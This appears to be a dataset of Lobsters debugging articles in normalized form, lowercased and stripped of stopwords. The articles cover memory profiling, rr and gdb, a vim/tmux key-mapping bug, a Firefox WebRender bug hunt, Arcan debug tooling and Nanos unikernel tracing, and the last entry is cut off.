96,Lobsters,debugging,Debugging,The Missing Fundamental,https://blog.testdouble.com/posts/2020-03-10-the-missing-fundamental/,missing fundamental,missing fundamental missing fundamental suppressed fundamental phantom fundamental fundamental software performance ali dynos fundamental investigate slug fundamental profile micah performance tooling fundamental identify fundamental query thing efficiently aggregation pipeline request timeouts large amount memory consumption timeouts memory consumption reduced factor conclusion investigate profile identify say hi,music composition production large part life outside software development much often find thinking way draw parallel two one parallel stuck past month concept missing fundamental harmonic sound said missing fundamental suppressed fundamental phantom fundamental overtone suggest fundamental frequency sound lack component fundamental frequency first learned concept help think applied work software engineer way skilled audio engineer leverage concept missing fundamental improve characteristic sound skilled software engineer use similar set skill improve performance application concept missing fundamental reproduced based overtone tone used create illusion bass sound system capable bass meir shashoua tel aviv cofounder wave audio patented algorithm create sense missing fundamental synthesizing higher harmonic wave audio released maxxbass plugin allow computer user apply synthesized harmonic audio file fundamental software performance ali recently tasked improving performance legacy codebase deployed heroku using nodejs mongodb angular one first step evaluating performance code audit dependency configuration great starting point often lead simple fix performance issue like updating database orm adapter query thing efficiently case audit dependency yield much dive configuration heroku really make sense performance challenge significant discovery number one application configured using performance l dynos heroku expensive highest tier available seemed strange since appear commensurate surface area application purpose sync data using heroku scheduler pull salesforce mongodb one first step reduce dyno size monitor log see performance l size warranted fundamental investigate heroku make pretty easy peek log app started heroku log tail tdclientslowapp yielded following trace app app last gc app app j stacktrace app app j stack trace app app exitframe pc app security context jsobject app getownpropertynames truncated app getownpropertydescriptors app app fatal error ineffective markcompacts app near heap limit allocation failed app javascript heap memory note slug application seem overly large warrant running memory lowest tier dyno heroku provides dyno allocates ram dug code path led stacktrace gain information fundamental profile nodejs pretty decent profiling tool engineer want dive performance profiling tdresident devops pro micah showed add flag node process startup influence manages garbage collection useful getting consistency crash want place constraint application runtime order sus source memory leak node optimizeforsize appjs artifically lowering max heap size heroku provision standard dynos yielded source leak method called getusers responsible querying list user permission mongodb sample code looked like first found getusers function req re userfind function err user var allusers user var adminusers var corpusers var techusers var formalusers var searchusers usersforeach function user userpermissionsadmin userpermissionsadmincorpusers userpermissionsadmintechusers userpermissionsadminformalusers userpermissionsadminsearchusers userpermissionsadminsuperadmin adminuserspush user userpermissionsgeneralcorpusers corpuserspush user userpermissionsgeneralformalusers formaluserspush user userpermissionsgeneralsearch searchuserspush user continued another line nodejs performance tooling builtin allows gain insight around memory cpu usage used next const performanceobserver performance require perfhooks const new performanceobserver item consolelog itemsgetentries performanceclearmarks oobserve entrytypes measure get approx mem usage add log line consolelog script us processmemoryusage heapused mb output performanceentry name getusers resstatus entrytype measure starttime duration script us mb looking code help wonder efficient way query aggregate information fundamental identify missing fundamental returning idea missing fundamental audio engineer must ask change frequency mix order bring thing harmony relevant question software engineer similar system need order bring harmony operation case also helpful consider question historical context fundamental original developer missing built case answer application query thing efficiently getusers method two thing wrong querying inefficiently user system allocating large array partition data based permission understood missing fundamental path forward try optimize poorly performing code see query thing efficiently came using asyncawait mongodb aggregation pipeline getusers async function req re const adminusers await useraggregate match permissionsadmincorpusers eq true permissionsadmintechusers eq true permissionsadminformalusers eq true permissionsadminsearchuser eq true permissionsadminsuperadmin eq true const corpusers await useraggregate match permissionsgeneralcorpusers eq true etc resstatus json data adminusers corpusers rewritten tested query make sure output reran performance profiling see difference performanceentry name getusers resstatus entrytype measure starttime duration script us mb using aggregation pipeline yielded order magnitude le memory cpu usage couple screenshots heroku dashboard app show beforeafter comparison well request timeouts large amount memory consumption timeouts memory consumption reduced factor conclusion find similar situation evaluating performance legacy code would encourage think asking question around missing fundamental walking investigate profile identify rinse repeat useful hope interested type work reach say hi always looking hire expert software engineer
97,Lobsters,debugging,Debugging,The character that swallowed a week,https://nibblestew.blogspot.com/2020/03/the-character-that-swallowed-week.html,character swallowed week,strace break tool rr debuglander sloggening final commercial announcement,last post looked compiling libreoffice scratch using meson contrary one might expect particularly difficult laborious codegen bit yes several required deciphering fairly straightforward unfortunately compiling source code sufficient usually one also want run result want new binary behave way old one thing get interesting trying run main libreoffice application particularly useful almost certainly work fortunately lo provides bunch sample test application one use one demo app start initialises lo runtime open gui window perfect build take hour install binary ready run produce segfault annoyingly produce segfault without useful information would aid debugging time take strace several attempt later discover lo try dynamic smart lo consists shared library rather link together seems happening code try determine main executable look shared library relative binary dlopens go merry way fails crash somewhere reason chose dig debugging brought interesting discovery naming one library called sal naturally would expect actual file called libsalso also makefile defining library call actual name instead libsalloso somewhere within bowel line make make ha system library name get lo appended seem logic one fine least fixed manual work program failed trying open data file easily fixed swiping binary file existing working installation failed weird assert failure seemed indicate runtime object system properly initialised lo built around custom object model called uno universal network object could tell name come following property provides object model close one java absolutely everything done inheritance functionality least three namespaces deep object defined custom language compiled c header using self built tool told generates roughly million line c header total class type object constructed runtime runtime written c actual implementation void pointer reinterpret cast break tool point easy avenue explored time bring gdb editing build definition file something simple editor debugging really requires ide command line interface even curse one cumbersome compared full fledged gui mouse hovers variable fortunately simple task create new eclipse project build taking hour install run debug worked really nicely day eventually eclipse code indexer crashed full reindexing operation restart eclipse crash restart indexing operation promptly crash eventual solution manually delete code absolutely necessary test app writer calc rest brought working set small enough crash increasing amount memory allocated eclipse jvm fix issue crash even given gig memory done sequence step leading crash could debugged runtime try initialise fails throw custom exception type exception caught ignored discarded followed calling custom error handling code code retrieves exception via method try introspect object information introspecting error object reason runtime initialisation failed requires runtime initialised working thing crash interestingly change code step grab exception print error message work correctly hooray framework guess fix issue gone new one took place somehow code got loop function called b called c function something called back function lead eternal loop stack exhaustion point two supposedly identical program one built gbuild one built meson behave identically nt give u approach solve problem single step program debugger execution differs happens know bug practice le simple code us ton oo helper class template even single function call lead many stack frame step manually helper go away optimisation enabled particular case ca nt used make debugging quite difficult even og change code much useful optimization every time change optimization level test take guessed hour build try manually single stepping code sort tedious manual labor human bad fortunately gdb python scripting interface thus one could write script run gdb connects common server order single step report current pc location halt differ worked perfectly program called libc reason call libc specifically getenv took different amount step finish program desynched almost immediately fixing seemed take much work idea scrapped manually single stepping code difficult accidentally go far start fortunately rr allows step backwards code execution well recording trace one program worked program worked well running time failed miserably reason remained unclear debuglander sloggening nevertheless point two debugging aide actually happen rr trace actually happening live debugger matter finding execution differs two day debugger stepping gave sort work hand something human brain well least mine nt back old strawgraspingat board like big framework uno code special compiler magic makefile list several flag used compile said code tried adding meson version help also assembly code fiddle register maybe problem nope maybe one library missing preprocessor define cause bad compilation everything seemed order exact thing original build system lo provide unit test functionality built meson yet figured fix get something done eventually converted one test exercise object crashed exact way reproducer bug le code unto debugger dear friend eventually desync point found one execution went header file line went header line getting fairly late simply noticing difference took smoking gun one twist story header file line line text nevertheless debugger reported line even allowed one inspect variable thing would expect able process execution nonexisting line happening debug info elf file corrupted way finally hit libreoffice generates two different set header idl file regular comprehensive also third bootstrap one let ignore header name supposed behaviour different implementation include either code compile sortofwork nt know original developer decided tempt odr violation god way nobody lo irc channel seemed know either finally core issue found reverse engineering makefiles found code generation phase creates regular header rather comprehensive one fix consisted changing one code generator command line argument l c recompiling took hour running binary finally one week worth debugging work rewarded blank window never looked sweeter final commercial announcement
100,Lobsters,debugging,Debugging,Debugging Gdb Using rr: Ptrace Emulation,https://robert.ocallahan.org/2020/03/debugging-gdb-using-rr-ptrace-emulation.html,debugging gdb using rr ptrace emulation,rr issue ptrace debug rr replay rr emulating ptrace quite ptrace test rr issue kpti,someone tried using rr debug gdb reported rr issue nt work effort able fix couple bug get working simple case using improved debugger improve debugger feel good main problem running gdb rr need emulate ptrace problem wanted debug rr replay rr linux process single ptracer rr need ptrace process recording case gdb process e debugging gdb need ptrace process e debugging ca nt ptraced gdb rr rr circumvents problem emulating ptrace gdb nt really ptrace debuggees far kernel concerned instead rr emulates gdb ptrace call think principle ptrace user eg gdb strace could support nested ptracing way although lot work surprised nt ptrace machinery gdb need already worked rr quite ptrace test prove get gdb working simple case fix couple cornercase bug rr synthesize sigchld signal sent emulated ptracer signal nt interacting properly sigsuspend reason gdb spawn ptraced process kill sigkill wait exit wait emulated rr linux regular wait syscalls wait nonchild process waiter ptracing target process rr gdb really ptracer native wait nt work already logic nt working process exit triggered signal rework actually pretty hard see rr issue horrible detail got gdb working discovered load symbol slowly rr every time gdb demangles symbol installs later remove sigsegv handler catch crash demangler sad inspire trust quality demangling code especially crash involve potentially corrupting memory writes slow rr rr default syscall handling path make cheap syscalls like rtsigaction lot expensive syscall buffering fast path frequent syscalls supporting rtsigaction along path would rather complicated nt think worth moment given work around problem using maint set catchdemanglercrashes suspect kpti especially syscalls per symbol demangle sigprocmask also called hurt gdb performance even without rr ideally someone would fix either fix demangling code possibly writing safe language like rust batch symbol demangling avoid installing removing signal handler thousand time move child process talk asynchronously ipc safer
101,Lobsters,debugging,Debugging,Post-Mortem Python Plotting,https://andyljones.com/posts/post-mortem-plotting.html,postmortem python plotting,postmortem python plotting drop interpreter right error happened stuff caller env session magic daft example nt look like anything trick learning debugger command absolutely worth,postmortem python plotting next time jupyter notebook get error somewhere deep stack run debug postmortem debugger drop interpreter right error happened inspect variable go stack figure happened enough rock world reader problem pdb limited interpreter lacking luxury tab completion bug requires something powerful well friend snippet def extract copy caller environment jupyter session import inspect import ctypes frame inspectstack caller frame frame name l g callerfcodeconame callerflocals callerfglobals ipython f f inspectstack ffilenamestartswith ipythoninput frame ipythonflocalsupdate k v k v gsitems k ipythonflocalsupdate k v k v lsitems k ctypespythonapipyframelocalstofast ctypespyobject ipython ctypescint extract single useful function written five year working python grab caller environment find interpreter session stack stuff caller env session working isolation def f x hello world extract f copy f internals session print x print hello world see magic enough combination debug magic daft example killer feature got piece numerical analysis fails occasionally debugging thing fail occassionally misery since knew circumstance caused bug probably already fixed postmortem debugging lifesaver case since let wait circumstance cause bug turn naturally consider snippet def randomwalk return nprandomnormal cumsum def firstpositives idxs range x randomwalk idxsappend x nonzero return nparray idxs generates distribution time random walk becomes positive time run fine occasionally throw indexerror earth call debug get usual prompt firstpositives range x randomwalk idxsappend x nonzero return nparray idxs ipdb type p x see something obviously wrong nt look like anything ipdb p x array bunch number hrm ok type extract quit debugger back jupyter session x magically appeared workspace quick pltplot x show sometimes random walk never becomes positive doh never becomes positive mean empty array positive index meaning bound artificial facile ridiculous example purportedly le random data happens three time week upon time commit actual thought figuring scenario leading bound help pdb extract instead program thoughtfree trick also invoke post mortem debugger pdbpm rather going debug magic nt invoke extract base stack go level first think error cause different place discovered learning debugger command absolutely worth nt wait error either drop breakpoint alias import pdb pdbsettrace code anywhere get debugger simply call extract directly chasing numerical issue often set statement trigger extract value get particularly large small extract utility bundled personal tool package call aljpy find somewhere new install using pip install githttps githubcomandyljonesaljpygit call extract import aljpy aljpyextract would nt recommend using tool package since change whim recommend building incidentally code version use also nailed support grabbing local arbitrary function module also throw error exit drop directly back session new local waiting def extract sourcenone copy variable caller ipython useful debugging codeblock python def f x hello world extract f raise error print x print hello world import inspect import ctypes source none frame inspectstack caller frame frame name l g callerfcodeconame callerflocals callerfglobals elif hasattr source func func sourcefunc name l g funcqualname funcclosure funcglobals elif hasattr source init func sourceinitfunc name l g funcqualname funcclosure funcglobals else raise valueerror fdont support source source ipython f f inspectstack ffilenamestartswith ipythoninput frame ipythonflocalsupdate k v k v gsitems k ipythonflocalsupdate k v k v lsitems k magic call make update flocals stick info http ctypespythonapipyframelocalstofast ctypespyobject ipython ctypescint message copied variable format name ipythonfcodeconame raise runtimeerror message
102,Lobsters,debugging,Debugging,My new favorite vim/tmux bug (2014),http://www.daniellesucher.com/2014/04/24/my-new-favorite-vim-tmux-bug/,new favorite vimtmux bug,initial poking around problem happen define edge problem changed recently totally different version around time started google doc keep track everything trying wait thing magically solve tmuxconfig wheeeeee got take bug home play tmuxconfig vimbundletmuxconfigtmuxautowriteautowritevimsh line thing trying actually wow happens send alone tmux sendkeys happens hit vim outside tmux cause beepingcase toggling vim inside tmux vim outside tmux else test claim actually check keystroke encoded bash opening terminal hitting controlv hitting key encoding end exactly command vim expect toggle case character refers vim useful answer setting tmux handle xtermstyle function key input sum tmux faq vim escaped normal mode n interpreted rest literally character interpreted separate vim command part single mapping intended w ri te processrelated takeaway absence evidence evidence absence verify assumption sooner least easytocheck one great discussion post hacker news every bug existence story different software component exactly told cosmic ray bug,week grateful coworkers know come grab something seriously weird going fill much glee mean minimal repro suffolk one machine open tmux open vim open new terminal tab vim get inserted current file beep lot file already content prepends appends line sometimes capitalizes something wtf wtf wtf thank going skim detail remains blog post endless excited ramble approximately figuring nonsense went initial poking around problem happen open new bash tab window enter command bash session lililililililill look suspicious macro something hiding one vim register use reg check content vim register nope nothing fishy anything funky tmux config tmuxconf exist quick googling around turn anything standard sort tmux config file fair enough put aside moment poked around bit define edge problem happens iterm terminal happens restarting vim restarting tmux reinstalling tmux reimaging suffolk happen vimmacvim outside tmux happen handful machine checked happen vim tmux ssh another machine one exception last one coworker said able replicate ssh remote coworker machine tried replicate happen isolated datum potentially relevant highly suspect day pretty convinced folk got mixed never really happened first place happens best u fit evidence cool got lay land changed recently ah machine newly reimaged maybe new broken incompatible version thing told tmux version frozen part install script believe everything told good guessed totally different version vim tmux bash o x machine machine exhibit problem around time started google doc keep track everything trying thing start look complicated know able remember everything tried especially multiple people involved horrible waste time repeat experiment forgetfulness even worse lose potentially relevant data bore full list version reinstallation step boy detail note point downgraded bash tmux vim match version working machine problem remained point sadly told machine going get bunch stuff reinstalled spend time poking sadness okay fair enough getting people way show must go wait thing magically solve imagine delight came next morning heard reinstalling stuff fixed problem super bummed day mystery stolen away exciting hung coworker bit give pointer look elasticsearch bug ran biggest mystery week aha noticed tmuxrelated vim plugin vim config tmuxconfig bonus point anyone feel like stopping look guess story end much time play moment best thing happened able replicate machine recently reimaged new workstation setup script meant able get bug onto laptop aw yeah wheeeeee got take bug home play sat take closer look tmuxconfig plugin vimbundletmuxconfigtmuxautowriteautowritevimsh creates preexec function called whenever start new bash session enter command bash line read tmux sendkeys pane n writeall commenting line cause problem go away running tmux sendkeys n writeall manually another bash window cause bug manifest regardless perfect thing trying actually ah plugin defines relevant mapping map silent writeall silent wall cr note moment jaw dropped one look sure n supposed seem anything rest mapping set save vim buffer stuff terminal basically trying mimic way macvim set save blur sure yet toggle capitalization make damn beep capitalization vim inside tmux vim outside tmux writeall interpreted normal vim command ri replace character cursor e take end word take end line put insert mode inserted end line sure preexec function get run multiple time bash sessioncommand must happening wow around time settled perform series experiment happens send alone tmux sendkeys input output beep beep beep c file open vim content next character get case toggled huh case get toggled capitalized toggled interesting happens hit vim outside tmux aw hell macbook even key yeargh fine whatever went installed could remap fnfn test stuff result beeping case toggling cause beepingcase toggling vim inside tmux vim outside tmux super confident mapping worked properly mean tested eventviewer realistic tmux sendkeys somehow send something different mapping think sending else test claim googling around learned actually check keystroke encoded bash opening terminal hitting controlv hitting key whoa neat seems useful checked encoding see could find difference oho jumped inside tmux encoded bash outside tmux instead dunno hold look closely inside tmux encoding end exactly command vim expect toggle case character coincidence think wait second look super familiar another reason oh right noticed earlier set function key like term set set set set set set set endif eye skimmed bit earlier looked like went bother verify assumption moved right past damnit time search vim doc oh hey refers vim argh argh argh miss inside conditional always happen term well whatever term bash okay let verify inside tmux term set screen outside tmux term set oh hell googling around turned useful answer setting tmux handle xtermstyle function key input setting option fact make bug go away option set computer thing hinting different solution time search tmuxconfig plugin see come oh goddamnit set setoption g defaultterminal option set conditional autowritevim satisfied vim restarted option set vim plugins sourced secretly mapped oh oh oh oh sum tmux set handle xtermstyle function key input tmuxconf actually copied vimbundletmuxconfigtmuxautowritetmuxconf tmuxconf therefore tmux received config tmuxconf setoption g defaultterminal term inside tmux outside tmux mean tmux set handle xtermstyle function key superclear fair clear way set tmux receive xterm function key properly would g xtermkeys vim check term see function key available see tmux faq character code sent function key interpreted literally actually vim set interpret higher function key explicitly term happens explicitly tmuxconf using set verified controlv inside tmux encoded since never explicitly set otherwise term inside tmux set mean condition never met thus never set vim never mapped properly vim config preexec function ran bash sent n tmux via tmux sendkeys vim escaped normal mode n interpreted rest literally literal string mapped vim writeall character interpreted separate vim command part single mapping intended interpreted series vim command escape anything far tell toggle case next three character w take start next word ri replace character cursor te take next e take end line put insert mode inserted end line long story short fix ln vimbundletmuxconfigtmuxconf tmuxconf processrelated takeaway absence evidence evidence absence noticed pretty early tmuxconf moved figuring okay guess anything weird config next time something missing seems like likely place look want think looking whether analogous config file exist working machine compare sooner verify assumption sooner least easytocheck one noticed thing way earlier skimmed past assuming surely referred assumption would super quick verify got ta verify assumption made especially one quick easy check edit via great discussion post hacker news every bug existence story different software component exactly told unless count cosmic ray bug natch
103,Lobsters,debugging,Debugging,How a broken memory module hid in plain sight - and how I blamed the Linux Kernel and two innocent hard drives,https://chollinger.com/blog/2020/02/how-a-broken-memory-module-hid-in-plain-sight-and-how-i-blamed-the-linux-kernel-and-two-innocent-hard-drives/,broken memory module hid plain sight blamed linux kernel two innocent hard drive,,software engineering gnulinux data ml thing
105,Lobsters,debugging,Debugging,Challenge: Help the Firefox Graphics team track down an interesting WebRender bug,https://mozillagfx.wordpress.com/2020/02/18/challenge-snitch-on-the-glitch-help-the-graphics-team-track-down-an-interesting-webrender-bug/,challenge help firefox graphic team track interesting webrender bug,know far bug bugzilla intel amd help firefox nightly filing bug bugzilla challenge guideline first reporter meet criterion gfxwrglitch mozillaorg http wikimozillaorgmatrix like published view post jessie bonisteel published,past little tracking interesting webrender bug people reporting release despite best effort unable determine clear step reproduce issue unable find fix today announcing special challenge community help u track step reproduce aka str bug win special limited edition firefox graphic team swag read detail interested participating know far bug late last year started seeing report random ui glitching bug people seeing release check report bugzilla know far bug seemingly random interval either two thing seem happen glitch black box majority report seen far come people using nvidia graphic card although seen report come happening intel amd well could though majority people officially shipped wr release nvidia cardsthere seem one clear driver version correlated bug sure driver bugall reporter far using window one reported bug thus far able determine clear consistent str one graphic team found way reproduce either use webrender daily none u encountered bug help without way reliably reproduce bug loss solve decided hold challenge engage community help u understand bug better interested helping u get root tricky bug please following download firefox nightly already use ideally using window see bug platform interested hearing ensure webrender enabledgo config set gfxwebrenderall true restart browserif encounter bug help u filing bug bugzilla following detail website bug happens seem happen specific action taken frequently bug happen make happen attach content support text filethe main thing really need consistent step result bug showing send limited edition graphic swag first bug reporter give u consistent str even easily find str still interested hearing whether see bug challenge guideline winner challenge chosen based following criterion bug report contains clear repeatable step make bug happenthis include thing like specific hardware configuration using certain add ons browsing certain site literally anything long reliably consistently cause bug appearbonus member graphic team follow step also make bug appearwe choose first reporter meet criterion say possible one bug one way reproduce winner receive special limited edition graphic team swag tshirt sticker update created channel gfxwrglitch mozillaorg matrix ask questionschat u info joing matrix check http wikimozillaorgmatrix like like loading published jessie bonisteel gfx engineering manager view post jessie bonisteel published february
106,Lobsters,debugging,Debugging,The Glitch Gallery: an online exhibition of pretty software bugs,https://glitchgallery.org/,glitch gallery online exhibition pretty software bug,gtfs data public transport association vbb,wanted use gtfs data public transport association vbb create art berlin public transport system extracted latitude longitude traffic stop use create path svg file stop berlin lie around could drop first three char use next three char coordinate grid poured data svg generator image result pointed illustrates exactly berlin traffic feel like later found messed substring throwing away first four char using next three char point svg
107,Lobsters,debugging,Debugging,"Leveraging the ""Display Server"" to Improve Debugging",https://arcan-fe.com/2020/02/10/leveraging-the-display-server-to-improve-debugging/,leveraging display server improve debugging,systemic software debugging context linux performance activation output isatty really much actually long one chain trust manpage proc pdf process file yama super complex data prctl onclick local interfacing stream deck device handover part case process parasite process identity stack overflow suggestion arcantui like,spend time digging softwareinexecution rather softwareatrest eg source code sometimes subject study malware hissing like snake lashing barrier virtual machine sometimes terrible software deserving exploit written sometimes driver faraway device flip bit clock got skewed circuit get hot time something extremesmany year ago friend distilled thought matter freeasinbeer systemic software debugging maybe one day enough structure incentive revisit topic le confined setting time might useful document experiment experience along way brings u topic post way using display server infrastructure position userspace stack reason bootstrap debugging may come bit strange first recall display server misnomer hence tradition course serve much display majority case would also find serve userinitiated blob transfer clipboard drag drop well range input device keyboard mouse sense terminal emulator web browser virtual machine monitor rightly fall category try refer ipc system amalgamation ipc system stitch userspace together thing interact withthe article structured around three group problem respective solution activation outputchain trustprocess identityeach explaining part go following video videothe central theme code come ipc system xlib xcb arcanshmif used construct debugging tool inside targeted process piggyback ipc system activation input information gatheringoutputthe gain get user friendly zerocost activation highbandwidth variable number channel collect process information cooperate client let provide higher level view debug state time add custom primitive none additional allocation postinstrumentation contextto add demarcation interesting target live inspection mature software part grander system far away comfort debug build clicktoset breakpoints launched safety integrated development environment culprit obvious issue might reliably repeatableyour goal might fix issue gather evidence communicate someone canalso bear mind directly debugger sense nuclear powered suisse army knife also known symbolic debugger tool gdb lldb rather whole gamut tooling needed understand role piece software fulfils currently functioning within rolethink intervention friendly version intimidating chart brendan gregg post linux performance would look like application block get closer idea activation outputthis first group problem cover software want cooperate adding feature may useful debugging later refer prebugging consider notion responsible proactive developer understand need others inspect application library thing execution environment simply account remaining sane getting thing done want make easier next one line get higher quality feedback went wrong fieldwhat normal practical option commandline argumentenvironment variablespecific user interface togglethese problematic though somewhat different way first two option problem communicating feature available user discover remember readmemd man page faqwiki ancient word wisdom spray painted live chicken something need announce option thereoptions also quite static get set evaluated program started want activate debug output dynamically well tough luck problem need reproducible without debug output enabledthe actual output also come noticeable system impact sending string stdout stderr may break introduce new bug processing step user might common traditional unix pipe filter structure also necessarily dumb pipe isatty much thing baud rate threading combination property make awful communication channel try multiplex debug output onthe option writing log device file clog storage wear flash storage inadvertently leave sensitive user information around formatting output also thing consider even simple printf serious gotcha read localedefined behaviour information better presented change time stream sample need tool built postprocessing option involve quite lot work implement feature mesh user interface property properly done however add quite lot power software look set debugging tool built chrome firefox course help also development environment incentive cost effort often better option still composes poorly noncooperative information collectionpostmortem crashdump slightly different story one call much longer discussion scope article though primitive emerge work transport core dump way annotating decent followup topicenough problem space description display server fit trivial window system client connects somehow requestsallocates kind storage container window draw either directly character pixel indirectly drawing command server intermediary like gpu return client get input event clipboard action back related channel hold true even terminal emulatorthese window may come kind type model attached indirectly combination property set parent window draw order directly type tag instance long list popups tooltips menu dnd arcan really much actually long onestep add debug typethis allows client agnostic tool enumerate window type compose together recordstreamshare control activation well data channel high bandwidth capable cleanly multiplex multiple data typesstep twosided allocationnow complicated step recall problem saying debugging feature needed commandline environment ideal approach would initiated user request run time zero cost usethis complicated achieve tap capability ipc system api design simplified version would possible context notification message debug window requested let client allocate window right type still leaf u drawback third option namely uncooperative client covered next sectionnow first part video explainable heartemoji button titlebar simply sends request client debug window wanted client question terminal emulator come arcan responds creating new window render relevant part emulator state machinechain trustafter trace like output getting debug data client complicated matter come proper debug interface also provides process control resource modification interface rely client actually cooperatingassuming process identifier client question also problem see last category identity let try attach debugger normal way firing ide terminal something effect gdb p sweetpidofmine ptraceonly promptly met something like operation permittedlow level debugging interface tend problematic every conceivable way convinced read horror show manpage belongs ptrace done already search around little bit count number vulnerability leading role study role jtag embedded system exploitation point thing designed much spring life intermittent necessity evolves permanent liability originally proc pdf process file filesystem proposed better design one safely say turn wayso fault example lessen damage make malware author work little bit linuxland yama equally intimidating mechanism imposes certain rule get attach tracer depending traced turn universally universally bad idea poking around procfsyou also use time workaround prefixing gdb p battering ram sudo regular stance anything sudo suid polkit etc indicator poor design somewhere everywhere friend let friend sudo poweron regular use ever need even implementation converting lower privilege context higher one privilege manipulation client access reducing towards least amount privilege course mean place organization like chain trust control reduce digressthe problem yama design ptrace perspective practically left choice given lower privilege client gdb get escalated much higher one attached parse super complex data process action indicate comprehend trust fantastically poor ideaso situation well rule modify ptrace relationship normally parent allowed trace child gdb attache begin work attach caseenter subtlety prctl come fantastic debug voyage isaac asimovfame part adventurefrom last section got mechanism negotiating debug control channel initiated display server extension bit complicated one place arcanshmif upper hand instead sending event saying could please create window type x ability force window upon clientthe shorthand form happened demo roughly pseudolua onclick local buf allocbuffer width height targetalloc clienthandle buf eventhandler debug actually creates full ipc channel sends client existing one type already locked debugthis serverside initiated signal userintent mechanism used request screenreader friendly view accessibility option used initiating screenshots video stream later angel covered article interfacing stream deck device client get part normal event loop see also handover part trayicon article pseudocode wise important bit case targetcommandnewsegment segmenttype debug doesnotmatch request debugwnd arcanshmifacquire happens client actually map well look part video second window populated within client process without cooperation clientthe ipc library code know client mapped incoming window library take upon provide implementation current one bit bare lot fun potential one pending much needed primitive suspend thread except quite close grey area set technique known process parasite use spin debugger though neither clean easyprctl property called prsetptracer allows process specify another process allowed attach via ptrace naive approach would fork set tracer pid returned fork also would work multiple reasonsone gdb lack way draw distinguishes stdinstdout ttys luckily enough terminal emulator inherit arcanshmif debug window use display hidden debug interface us debug window request another debug window get inherited terminal used set drawing emulation gdb workthe experienced posix connoisseur see chicken egg problem process debugged need wait know pid debugger process order set permitted tracer debugger need pid target process order attachso current solution create two pipe pair parent debugger debuffer parent inherit appropriate endshave terminal emulator stop exec ing child process write back become debugger pid back pipe block read parentdebug target receive pid set prtctl write process pid backthe child process received tracetarget pid add argument continues exec debuggerprofitthe clip show action tool launch way come controlled context turn spawn new process subprocess need perform attach action becomes even masochistic case one would need repeat dance ptracing chain child child attempt call ptrace perform setupnow communication channel bootstrapping ptracetools retaining chain trust negotiated display server initiated user tool access apis break free terminal emulator shackle good building block advanced instrumentsprocess identityprocfs used explore operating system perceives specific process resource currently allocated order identifier needed trick question start figure process identifier process tied x window quick search around get stack overflow suggestion xprop netwmpid cut problem really work atom netwmpid based client nice enough provide nice enough provide real one random nonsense like pid x server fun basic antidebuggingeven process id retrieved truthful correct might case start reading proc entry inherently race yin modern time problem get easier take container paravirtualization technique account view outer system resource perspective process vastly different processeson hand code collecting data run within target process procself directory relied number really interesting venue pursue look debugif implementation codebase idea ping interested chatting thingsfor remainder article settle bit implemented thus far brings u last part videothe bit showcased open modify environment variable well enumerate currently open file descriptor even make copy content current state hud menu appears outer wm serverside filepicking hexeditor appears one standard arcantui widget bufferwndwhat showcased spawn shell context process normal interactive exploration redirectinterceptmaninthe middle intercept pipe socket live editing hex editor rounding thing two powerful venue around corner combined dynamic network transparencyredirection easy use lightning fast way setting multiple attached troubleshooting tool oneclick share someone elsesince primitive nest handing new window primitive get way building dynamic hierarchy reusing carrier multiple type data think context wholesystem virtualization like qemu layer qemu guest o shell application inside guest use arcan like loading related
109,Lobsters,debugging,Debugging,Web Replay,https://webreplay.io,web replay,fix janky frame,fix janky frame recorded janky frame fixing easy playing point time adjusting style
111,Lobsters,debugging,Debugging,Profiling and Tracing the Nanos Unikernel,https://nanovms.com/dev/tutorials/profiling-and-tracing-nanos-unikernel,profiling tracing nanos unikernel,brand new kernel ahem today prior work unikernels much debuggable introduced flame graph profile trace uniprof clock syscalls hello world recent paper hotcloud book let turn ftrace ftrace nanos nanos source ops,benchmark easy point say slow hell pm skilled noticing something happened slow something almost anyone whip apache bench iperf however diagnose actual root problem go fixing new code specifically kernel code brand new kernel nt traditional interactive userspace nt support concept running multiple program vm ahem earlier fairly nasty code extremely slow know basic function like memcpy memset foolishly copying byte byte course happens team small blitzkrieging way year operating system development digress needed fix sort problem knew unknown unknown different matter problem type issue fairly hard pinpoint issue nt know look profilers come profilers many wonderful thing purpose solving problem concerned finding low hanging fruit dramatically slow introducing profiler nt fixing known performance issue seeing key securing future fact looking manycore future looking hella manycore future world running hundred hardware thread norm today thousand thread tomorrow nanos multiple threaded single process system explicit design goal take advantage hardware thread interpreted language universe inherently single process single thread nt see working beyond nt think realistic expect people using language migrate multithreaded language see language upgradesreplacements coming designed deal instead nanos designed run vm never directly bare metal however design goal could ran single thread environment microservice could ran many many thread environment also planned future work could influence scheduling concern well anywho ca nt measure trying fix slowness ca nt fix core thread world nt matter let measure let fix prior work despite false claim exist unikernels much debuggable maybe even one program looking versus hundred process find fresh ubuntu instance extensive work done directly profilingtracing nt nearly first year ago brendan gregg introduced flame graph profile trace yes brendan gregg later florian schmidt plenty work done uniprof point anyone telling ca nt profile trace one thing intentionally lying common debugging tool like strace well sort functionality forever precisely figured hell given interpreter trying adding support keep mind run vms like could use host strace get output instance looking syscall output simple nodejs hello world getpid direct return rsp rtsigprocmask direct return rsp mmap mmap target size len prot flag fd offset anon target len given size direct return rsp mprotect mprotect addr len prot direct return rsp clone clone flag childstack ptid ctid newtls direct return rsp rtsigprocmask direct return rsp rtsigaction direct return rsp rtsigprocmask direct return rsp csignal killed tea ops load hijs turn output along useful debugging output real world example functionality useful notice something strange look filesystem node via pkg content command via ops ops pkg content file node file packagemanifest dir sysroot dir sysrootlib dir file file file file file file file dir file dir sysrootproc file sysrootprocmeminfo dir sysrootusr dir sysrootusrlib dir file hell procmeminfo thought nt linux nt rather go make million modification commodity software wish support sometimes place oneoff stub thing nt currently wo nt ever support place instead case without file interpreter choke byte stub however strace confused profiling honestly wrong tool almost everything shop people strongly reprimanded pulling strace box live prod db slows thing tremendously actually work utilizes ptrace really make wonder world gvisor project get ok google get lot backlash security community kubernetes something positioning ptrace optional platform complete nonstarter even trivial toyhello world project going syscall heavy ruby clock syscalls hello world recent paper hotcloud entitled true cost containing gvisor case study none famous arpacidusseaus find observation like file access slower aside really bummed andrea remzi popularized notion container form virtualization see used language much function laid book recommend extremely accessible text view container classic hardware virtualization two completely different type software definitely thing different capability let turn ftrace ok back tracing profiling let fix slow code profiling individual application probably use different tool one use profile kernel case one might turn ftrace course using linux well nanos ai nt linux general purpose operating system either much blur line application operating system rather reinventing wheel one brilliant engineer ported ftrace rudimentary ftrace support available nanos bring full circle look function entry exit inside kernel figure slow follow along tutorial obviously need nanos source also want python panda plotly two little python snippet included tool dir first python app format large trace dump second draw neat little toggable graph using plotly showing expensive tracking core utiliziation per function call drill various call click bar toggle expose functionality inside ops reason explicitly made profile kernel code anyone would investigating fixing something going end touching nanos ops however nanos 